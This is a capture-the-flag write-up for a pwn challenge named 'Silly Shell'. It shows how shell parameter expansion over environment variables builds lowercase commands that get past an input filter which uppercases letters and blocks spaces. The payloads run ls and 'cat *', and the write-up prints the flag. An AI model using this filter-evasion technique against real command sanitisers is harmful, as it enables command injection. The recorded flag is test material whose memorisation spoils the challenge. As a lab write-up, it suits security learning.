# Silly Shell Writeup

Challenge: `Silly Shell`

Category: `Pwn`

## Summary

The service exposes a shell-like prompt, but it mangles user input:

- lowercase letters are uppercased
- digits are replaced with emoji
- spaces are unusable

Direct commands like `ls` fail because they become `LS`.

## Recon

The challenge details came from the live CTFd API. The challenge was a dynamic TCP container on port `1337`, started through the CTFd container API and exposed as:

```bash
nc tcp.sillyctf.psuccso.org 31572
```

Initial probes showed:

```bash
ls
```

became:

```text
sh: LS: not found
```

Variable expansion still worked, so:

```bash
${PATH##*:}
```

expanded to:

```text
/bin
```

and:

```bash
${PWD}
```

showed the working directory was:

```text
/chal
```

## Exploit

Since typed lowercase letters were corrupted, the fix was to build lowercase command names from environment-variable contents using shell parameter expansion.

To build `ls`:

- `l` came from `/chal`
- `s` came from the first `PATH` component ending in `sbin`

Payload:

```bash
A=${PWD##????};X=${PATH%%:*};Y=${X##*/};B=${Y%???};C=$A$B;${PATH##*:}/$C
```

That resolved to `/bin/ls` and revealed:

```text
flag.txt
```

To build `cat`:

- `c` and `a` came from `/chal`
- `t` came from `TERM` (`xterm-256color`)

Final payload:

```bash
P=${PWD#?};C=${P%???};A=${P#??};A=${A%?};T=${TERM#?};T=${T%????????????};D=$C$A$T;${PATH##*:}/$D	*
```

This resolved to `/bin/cat *` and printed the flag.

## Flag

```text
sillyCTF{Us3_yoUr_ENVironmen7_2_YouR_adv4ntag3}
```

## Verification

The flag was submitted through the CTFd API and returned:

```text
{"success": true, "data": {"status": "correct", "message": "Correct"}}
```
